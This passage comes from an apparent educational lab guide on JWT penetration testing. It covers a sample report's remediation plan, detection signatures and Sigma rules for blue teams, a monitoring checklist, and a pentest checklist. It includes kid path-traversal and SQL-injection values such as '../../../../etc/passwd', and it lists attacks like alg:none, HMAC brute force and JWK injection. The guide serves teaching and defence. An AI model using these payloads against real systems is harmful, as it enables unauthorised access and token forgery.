   - Exploitable remotely without authentication

2. **Weak HMAC Secret (CVSS 9.1)**
   - Secret can be brute-forced in under 1 second
   - Allows token forgery
   - All tokens compromised

## Business Impact

- **Data Breach Risk:** High - Attackers can access all user data
- **Compliance:** GDPR, PCI-DSS violations likely
- **Reputation:** Severe damage if exploited
- **Financial:** Potential regulatory fines, breach costs

## Recommended Actions

**Immediate (Next 24 hours):**
1. Deploy patches for critical findings
2. Rotate all secrets and keys
3. Invalidate all existing tokens
4. Enable enhanced logging and monitoring

**Short-term (Next 7 days):**
1. Implement token revocation mechanism
2. Add security tests to CI/CD pipeline
3. Conduct code review of authentication system

**Long-term (Next 30 days):**
1. Migration to asymmetric keys (RS256)
2. Security training for development team
3. Quarterly penetration testing program
```

---

### 3.5 Detection & Blue Team Perspective

**What JWT Attacks Look Like in Logs:**

```python
"""
Detection signatures for JWT attacks in server logs
"""

# alg:none attack signature
"""
Decoded header shows: {"alg": "none", "typ": "JWT"}
Signature portion is empty
Multiple requests with different payloads, same (empty) signature
"""

# Brute-force attack signature
"""
NOT visible in server logs (offline attack)
Defense: Use strong secrets (256-bit entropy)
"""

# Algorithm confusion signature
"""
Token header shows alg:HS256
But token was originally issued as RS256 (check issuance logs)
Signature length inconsistent with algorithm
"""

# kid injection signature
"""
kid header contains: "../", "../../", "null", or SQL keywords
Examples:
  "kid": "../../dev/null"
  "kid": "' UNION SELECT"
  "kid": "../../../../etc/passwd"
"""

# JWK injection signature
"""
Token header contains "jwk" or "jku" fields
jwk field contains attacker's public key
jku points to external domain
"""
```

**Detection Rules (Sigma Format):**

```yaml
title: JWT alg:none Attack Detected
description: Detects JWT tokens with algorithm set to none
detection:
  selection:
    jwt_header|contains: '"alg":"none"'
  condition: selection
level: critical

---

title: JWT kid Path Traversal
description: Detects path traversal attempts in JWT kid header
detection:
  selection:
    jwt_header_kid|contains:
      - '../'
      - '..%2f'
      - '/etc/'
      - '/dev/null'
  condition: selection
level: high

---

title: JWT with Embedded Key (JWK)
description: Detects JWT tokens with embedded public keys
detection:
  selection:
    jwt_header|contains:
      - '"jwk":'
      - '"jku":'
  condition: selection
level: high
```

**Monitoring Recommendations:**

```python
"""
JWT Security Monitoring Checklist

1. Log all JWT verification failures with:
   - Timestamp
   - Source IP
   - Failed token header (not payload - may contain PII)
   - Failure reason (expired, invalid signature, wrong audience, etc.)

2. Alert on:
   - Multiple verification failures from same IP (>5 in 1 minute)
   - alg:none tokens
   - Tokens with kid containing "../"
   - Tokens with jwk/jku headers
   - Expired tokens (may indicate replay attack)
   - Wrong audience (may indicate token theft)

3. Baseline normal behavior:
   - Typical token lifetime before refresh
   - Normal token issuance rate
   - Expected algorithms (should be consistent)

4. Anomaly detection:
   - Sudden spike in token issuance
   - Algorithm changes (RS256 -> HS256)
   - Token usage from unexpected geolocations
   - Token reuse after password change
"""
```

**Key Takeaway:** Understanding attacks from the defender's perspective makes you a better penetration tester. Include detection guidance in your reports to help blue teams respond.

---

## Quick Reference: JWT Pentest Checklist

### Reconnaissance
- [ ] Capture JWT tokens from login/auth endpoints
- [ ] Decode header and payload (jwt_analyzer.py)
- [ ] Identify algorithm (HS256, RS256, none?)
- [ ] Check for custom headers (kid, jwk, jku)
- [ ] Note presence/absence of critical claims (exp, aud, iss)
- [ ] Check token storage method (cookie, localStorage, URL?)

### Basic Attacks
- [ ] Test alg:none acceptance
- [ ] Try case variations (None, NONE, nOnE)
- [ ] Brute-force HMAC secret with common wordlist
- [ ] Test expired token replay (modify exp or remove it)
- [ ] Test cross-audience abuse (use token on different service)
- [ ] Test missing issuer validation (forge iss claim)

### Advanced Attacks
- [ ] Algorithm confusion (RS256 → HS256 with public key)
- [ ] kid path traversal (../../dev/null)
- [ ] kid SQL injection (' UNION SELECT)
- [ ] JWK header injection (embed attacker's public key)
- [ ] JKU header injection (point to attacker's key server)
- [ ] Token theft via URL leakage
- [ ] Token persistence after password change

### Chaining
- [ ] Weak secret → forge admin token → access admin endpoints
- [ ] Algorithm confusion → kid injection → persistence
- [ ] Token theft → replay → lateral movement

### Reporting
- [ ] Document each finding with severity (CVSS score)
- [ ] Provide step-by-step reproduction steps
- [ ] Include evidence (requests, responses, tokens)
- [ ] Suggest specific remediation code
- [ ] Note detection opportunities for blue team

---

**Document Version:** 1.0
**Framework:** HAIAMM v2.0
**Practice:** Education & Guidance (EG)
**Domain:** Software (Lab)
**Author:** Verifhai
